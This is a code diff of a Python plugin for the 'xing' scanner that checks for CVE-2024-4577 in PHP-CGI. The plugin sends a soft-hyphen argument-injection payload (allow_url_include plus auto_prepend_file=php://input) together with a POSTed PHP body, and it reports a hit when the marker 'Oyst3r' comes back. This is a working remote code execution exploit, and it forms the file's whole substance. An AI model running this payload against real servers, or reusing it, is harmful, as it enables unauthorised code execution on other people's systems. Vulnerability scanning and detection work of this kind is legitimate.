@@ -1,23 +1,16 @@
-from sys import exception
-from urllib import response
-
-from flask import request
 from xing.core.BasePlugin import BasePlugin
 from xing.utils import http_req, get_logger
 from xing.core import PluginType, SchemeType
-
-
-# 官方演示站点 http://www.any800.com/
-
 
 class Plugin(BasePlugin):
     def __init__(self):
         super(Plugin, self).__init__()
         self.plugin_type = PluginType.POC
-        self.vul_name = "发现 CVE-2024-4577"
-        self.app_name = 'CVE-2024-4577'
+        self.vul_name = "CVE-2024-4577"
+        self.app_name = 'PHP'
         self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]
 
+    
     def verify(self, target):
         
         payloads = ['/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
@@ -27,14 +20,12 @@ class Plugin(BasePlugin):
         headers = {
             "Content-Type": "application/x-www-form-urlencoded"
         }
-
+        check = b"Oyst3r"
+        self.logger.info("verify {}".format(target))
         for payload in payloads:
             url = target + payload
-            try:
-                response = http_req(url,"post",headers=headers)
-                response_text = response.content
-                if "Oyst3r" in response_text or "directory" in response_text or "index of" in response_text:
-                    self.logger.success("found {} {}".format(self.app_name, url))
-                    return url
-            except Exception as e:
-                print(f"(!) Error testing {url}: {e}")
+            response = http_req(url,"post",headers=headers,data=php_code)
+            response_text = response.content
+            if check in response_text:
+                self.logger.success("found {} {}".format(self.app_name, url))
+                return url
